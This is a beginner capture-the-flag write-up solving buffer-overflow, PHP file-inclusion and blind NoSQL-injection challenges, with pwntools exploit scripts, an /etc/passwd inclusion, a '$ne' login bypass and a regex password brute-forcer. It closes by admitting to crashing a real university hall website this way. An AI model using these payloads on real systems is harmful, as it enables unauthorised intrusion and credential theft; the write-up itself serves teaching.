---
description: A beginner level CTF I did with friends. More thorough for easy reading.
---

# Rush CTF

## Pwn

If you're unfamiliar with Buffer Overflows, might want to read this:

{% embed url="https://rouvin.gitbook.io/ibreakstuff/buffer-overflows/prior-knowledge/buffer-overflow" %}

### Poune

Here is the source code of the binary:

```c
#include <stdio.h>
#include <stdlib.h>

void main()
{
    int var;
    long int check = 0x04030201;
    char buf[0x30];

    puts("Hello kind sir!");
    printf("My variable \"check\" value is %p.\nCould you change it to 0xc0febabe?\n", check);
    printf("This is the current buffer: %s\n", buf);
    fgets(buf, 0x40, stdin);

    if (check == 0x04030201)
    {
        puts("Mmmh not quite...\n");
    }
    if (check != 0x04030201 && check != 0xc0febabe)
    {
        puts("Mmmh getting closer!...");
        printf("This is the new value of \"check\": %p\n", check);
    }
    if (check == 0xc0febabe)
    {
        puts("Thanks man, you're a life saver!\nHere is your reward, a shell! ");
        system("/bin/sh");
        puts("Bye bye!\n");
    }
}
```

This program checks for a variable checks for the value of a variable `check`, and it would give us a shell should it be `0xc0febabe`. It takes an input using `fgets`, which is vulnerable to a Buffer Overflow vulnerability. We can first run `checksec` and `file` on the binary to see the security protections and other information:

{% code overflow="wrap" %}
```bash
gdb-peda$ checksec chall
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial

$ file chall                                                                                                              
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=6f24ec1597edb178ec5b862b44e5fbcb92df3137, for GNU/Linux 3.2.0, not stripped
```
{% endcode %}

So this is a 64-bit binary. Here's the breakdown of the `checksec` output:

* CANARY is disabled, meaning there are no stack cookies in place&#x20;
* FORTIFY is disabled, essentially meaning there are no checks in place when the stack is overwritten using large inputs.&#x20;
* NX is **enabled**, meaning we cannot inject shellcode into this since the stack is non-excutable.
* PIE is disabled, meaning ASLR is not enabled and the addresses of functions and libraries loaded in virtual memory is static **and never changes each time the binary is run**.
* RELRO is disabled, but not relevant here.

Since the binary is vulnerable to a Buffer Overflow, we first need to check the buffer size to see how many junk characters are needed to control the EIP. We can first generate a large output of 'A' (which is equal to `0x41` in hex) and see if it changes the value of check.

<figure><img src="../.gitbook/assets/image (8) (6).png" alt=""><figcaption></figcaption></figure>

From the above, an input of 60 'A' resulted in the value of `check` being overwritten completely. We can change the last 4 characters of the input to 'B' (which is `0x42` in hex) to easily see if we have overwritten the `check` variable (which is 4 bytes in length).&#x20;

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

So we have successfully confirmed we have control over the vcalue of check. Now all we need to do is have 56 bytes of junk characters, then replace the last 4 characters (which are Bs) to the desired value. We can use `pwntools` to connect and send our input to the server and get the flag.

<figure><img src="../.gitbook/assets/image (1) (10).png" alt=""><figcaption></figcaption></figure>

```python
from pwn import *

#r = process('chall')
r = remote("challs.ctf.cafe", 7777)

addr = p64(0xc0febabe) # format the bytes

junk = b'A' * 56
payload = junk + addr # combine payload
r.sendline(payload)
r.interactive()
```

### Onyo

No source code given to me. So, we can use `ghidra` to decompile and view the pseudocode for this binary in C. Viewing the `main` function, we this pseudocode:

<figure><img src="../.gitbook/assets/image (16) (5).png" alt=""><figcaption></figcaption></figure>

This uses `gets`, which is a vulnerable function when getting user input. This, combiend with the small array size of the `local_c` variable means this is definitely vulnerbale to a Buffer Overflow. Unlike the previous challenge, we don't have a `check` variable being used to give us a shell.

The output of the binary hint towards another function called `please_call_me`, and we have to somehow call the function. Viewing the function in Ghidra, all it does is give a shell.

<figure><img src="../.gitbook/assets/image (4) (10).png" alt=""><figcaption></figcaption></figure>

So the exploit path is clear: Buffer Overflow --> Control Instruction Pointer --> Call this function --> Get Flag.

Again, we can do our prior enumeration of the file using `file` and `checksec` commands.

{% code overflow="wrap" %}
```
$ file chall
chall: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=838c3ab2792a09b81c8259f7b86265675b60d80e, for GNU/Linux 3.2.0, not stripped

gdb-peda$ checksec chall
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
{% endcode %}

The important thing to note here is that PIE is disabled, meaning ASLR is disabled. This means the addresses of the functions never change. We can first find the addresses of the `please_call_me` function.

<figure><img src="../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>

We see that the first address is `0x0000000000401146`. Because ASLR is disabled, this function is **always loaded at this address in memory**. The instruction pointer must be controlled and made to point here to run the function. Now, we can find the length of the buffer needed to control that.&#x20;

We can use `pattern_create` and `pattern_offset` within `gdb-peda` to enumerate this. Since the memory allocated to the `local_c` variable wasn't large (it was only at 4 bytes), we can start with an input of 20 characters.

<figure><img src="../.gitbook/assets/image (6) (8).png" alt=""><figcaption></figcaption></figure>

This is the command line input required when using `gdb-peda`. Now, the program should have crashed due to Segmentation Fault (memory allocation is whack because we messed it up with a huge input). `gdb-peda` would show the values of the stack.

<figure><img src="../.gitbook/assets/image (20).png" alt=""><figcaption></figcaption></figure>

Taking `$AAnAACA`, we can find the number of 'junk' characters required.

```
gdb-peda$ pattern_offset '$AAnAACA'
$AAnAACA found at offset: 12
```

So we need 12 junk characters before controlling the instruction pointer. From here, we can create a quick `python` script to do the following using `pwntools`:

* Connect to the server
* Send 12 junk characters
* Call an `exit` function by sending its address (more specifically, call `ret`)
* Call the `please_call_me` function by sending its address
* Go interactive to gain a shell

But why do we need to call `exit`? This is because if we were to overflow the stack and jump to the `please_call_me` function immediately, it would **still cause a segmentation fault because the main program is still running**. This would terminate the shell the function gives us.&#x20;

As such, we need to append the address of a `RET` call in front of the address of the function. Here's the output of the script:

<figure><img src="../.gitbook/assets/image (13) (2).png" alt=""><figcaption></figcaption></figure>

```python
from pwn import *

#r = process('chall')
r = remote("challs.ctf.cafe", 8888)
junk = b'A' * 12 # junk chars
exit = p64(0x004011a8) # format address
addr = p64(0x00401146) # format address

payload = junk
payload += exit
payload += addr
r.sendline(payload)
r.interactive()
```

## Web

### Blog

This is a Directory Traversal Exploit:

{% embed url="https://rouvin.gitbook.io/ibreakstuff/website-security/directory-traversal" %}

Blog presents us with a basic blog page:

<figure><img src="../.gitbook/assets/image (9) (7).png" alt=""><figcaption></figcaption></figure>

Using `burpsuite`, which passively scans the website, we can view the files present in the website:

<figure><img src="../.gitbook/assets/image (2) (3).png" alt=""><figcaption></figcaption></figure>

We can see there's a `post.php` file that accepts a `?page` parameter. It seems to take a file name as the input. We can test this for Local File Inclusion by first trying to trigger some error by changing that parameter. In this case, visited `http://challs.ctf.cafe:5555/post.php?page=?`, and this was error that appeared.&#x20;

<figure><img src="../.gitbook/assets/image (11) (6).png" alt=""><figcaption></figcaption></figure>

This website uses the `include` function from PHP, which is known to be vulnerable to LFI. As such, we can view the `/etc/passwd` file to find the flag.&#x20;

<figure><img src="../.gitbook/assets/image (7) (5).png" alt=""><figcaption></figcaption></figure>

Right at the bottom, we can see the flag.

<figure><img src="../.gitbook/assets/image (19) (2).png" alt=""><figcaption></figcaption></figure>

### SecureVault V2

The hint here is that the 'developer' is sick of SQL, hence he has 'changed it up'. SQL is a well-known language to manage databases like MySQL, PostgreSQL or MS-SQL. Should one not use SQL, a good alternative is MongoDB, which does not use SQL at all.

The website presented to us shows us a login page:

<figure><img src="../.gitbook/assets/image (15).png" alt=""><figcaption></figcaption></figure>

Trying to send any login results in a 403 Forbidden code. We can first test this login page in `Burpsuite`. I first changed the POST data parameters to a JSON object to try and bypass this login.

<figure><img src="../.gitbook/assets/image (14) (3).png" alt=""><figcaption></figcaption></figure>

So why did this work? Well, this is because of what we sent in, which was something processed by the MongoDB backend (which we have now confirmed). How MongoDB works is basically through JSON objects, which rely on key value pairs (like hash maps).&#x20;

We can take a closer look at our input here:

```json
{"username": {"$ne": null}, "password": {"$ne": null}}
```

What does `$ne` do? Well, it is an expression for 'Not Equals'. So what we are doing here is telling the database that `username` and `password` are **not equals** to **null**. This is true of course, because these variables are never **null** (which is empty). Thus, because I forced a true condition to occur, this shows a different page (which is a 200 OK page).&#x20;

The challenge here is to somehow obtain the user's password from this mechanism. Even though we logged in, there is nothing inherently interesting in the contents of the application (All it does it tell me we logged in).

So why not we use this difference in response (either 403 Forbidden or 200 OK) to validate some arbitrary condtions? We can take 200 OK as the **true** condition, and 403 Forbidden as **false**. This is the basis of **Blind NoSQL Injection**.&#x20;

Because the database actually processes our input, we can use Regex to brute force the password. This can be done using the `$regex` function. We know that the first character of the flag is R, so let's try that first.&#x20;

<figure><img src="../.gitbook/assets/image (5) (9).png" alt=""><figcaption></figcaption></figure>

So what happens if we change the character to something else?&#x20;

<figure><img src="../.gitbook/assets/image (3) (3) (5).png" alt=""><figcaption></figcaption></figure>

It gives us a **false** condition. We can use this flaw in the application to **brute force the password character by character.** We know the second character is U (as all flags start with 'RUSH{' ), so we can test the second character as well:

<figure><img src="../.gitbook/assets/image (10) (3).png" alt=""><figcaption></figcaption></figure>

So we can use blind injection to get the flag. A simple `python` script can run through this easily:

```python
import requests
import urllib3
import string
import urllib
urllib3.disable_warnings()

username="admin"
password="RUSH{"
u="http://challs.ctf.cafe:9999/login"
headers={'content-type': 'application/json'}

while True:
    for c in string.printable:
        if c not in ['*','+','.','?','|']:
            payload='{"username": {"$eq": "%s"}, "password": {"$regex": "^%s" }}' % (username, password + c)
            r = requests.post(u, data = payload, headers = headers, verify = False, allow_redirects = False)
            if 'Logged' in r.text:
                print("Found one more char : %s" % (password+c))
                password += c
```

<figure><img src="../.gitbook/assets/image (12).png" alt=""><figcaption></figcaption></figure>

NoSQL Injection is pretty powerful. A certain NUS Hall's website is vulnerable to this (and was crashed by me using this oops).&#x20;
